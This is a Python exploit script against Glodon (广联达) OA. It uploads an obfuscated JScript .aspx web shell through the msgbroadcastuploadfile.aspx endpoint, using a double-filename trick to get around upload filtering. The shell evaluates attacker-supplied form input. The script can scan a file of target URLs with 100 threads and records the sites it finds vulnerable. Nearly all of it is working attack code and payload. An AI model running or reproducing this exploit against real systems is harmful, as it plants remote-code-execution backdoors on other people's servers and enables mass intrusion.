#广联达oa 后台文件上传漏洞

import requests,argparse,sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = '''
        ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗         ███████╗██╗██╗     ███████╗
        ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗        ██╔════╝██║██║     ██╔════╝
        ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║        █████╗  ██║██║     █████╗  
        ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║        ██╔══╝  ██║██║     ██╔══╝  
        ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝███████╗██║     ██║███████╗███████╗
         ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝ 
                                                                                        author:秋妤
                                                                                        date:2024.09.22
                                                                                        version:1.0
    '''
    print(test)

def poc(target):
    payload = "/gtp/im/services/group/msgbroadcastuploadfile.aspx"
    headers = {
        "X-Requested-With":"Ext.basex",
        "Accept":"text/html,application/xhtml+xml,image/jxr,*/*",
        "Accept-Language":"zh-Hans-CN,zh-Hans;q=0.5",
        "User-Agent":"Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/107.0.0.0Safari/537.36",
        "Accept-Encoding":"gzip,deflate",
        "Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj",
        "Referer:http":"//10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&menuitemid=120743&frame=1&modulecode=GTP.Workflow.TaskCenterModule&tabID=40",
        "Connection":"close",
        "Content-Length":"421",
    }
    data = """------WebKitFormBoundaryFfJZ4PlAZBixjELj
            Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
            Content-Type: application/text
            
            <%@ Page Language="Jscript" Debug=true%>
            <%
            var FRWT='XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD';
            var GFMA=Request.Form("qmq1");
            var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);
            eval(GFMA, ONOQ);
            %>
            
            ------WebKitFormBoundaryFfJZ4PlAZBixjELj--"""
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('广联达_result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description = "这是一个关于广联达oa 后台文件上传漏洞的脚本")
    parser.add_argument("-u", "--url", dest = "url", help = "Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()